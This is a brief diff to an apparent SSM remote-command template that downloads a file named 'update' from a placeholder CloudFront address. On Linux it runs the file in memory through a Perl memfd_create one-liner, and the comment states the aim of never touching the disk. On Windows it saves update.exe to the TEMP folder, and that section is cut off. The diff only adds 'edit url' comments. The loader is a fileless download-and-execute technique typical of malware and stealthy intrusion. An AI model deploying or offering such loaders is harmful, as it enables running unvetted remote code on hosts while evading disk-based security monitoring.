@@ -1,6 +1,7 @@
 # Linux SSM command
 # Download and execute without touching the disk
-curl -fsSL https://your-distro.cloudfront.net/updates/update.exe | perl -e '
+## edit url
+curl -fsSL https://your-distro.cloudfront.net/updates/update | perl -e '
     $name = "in_memory_update";
     $fd = syscall(319, $name, 1); # 319 is memfd_create
     open($fh, ">&=$fd");
@@ -9,6 +10,7 @@ curl -fsSL https://your-distro.cloudfront.net/updates/update.exe | perl -e '
 '
 
 # Windows SSM command
+## edit url
 $url = "https://your-distro.cloudfront.net/updates/update.exe"
 $path = "$env:TEMP\update.exe"
 
